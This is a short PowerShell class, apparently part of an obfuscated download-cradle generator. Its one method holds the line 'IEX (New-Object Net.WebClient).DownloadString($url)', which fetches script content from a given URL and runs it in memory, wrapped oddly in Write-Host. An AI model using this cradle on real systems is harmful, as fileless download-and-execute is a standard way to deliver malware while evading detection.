Class ObfDownloadFileContent8 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Invoke\2
        Write-Host IEX (New-Object Net.WebClient).DownloadString($url)
    }

}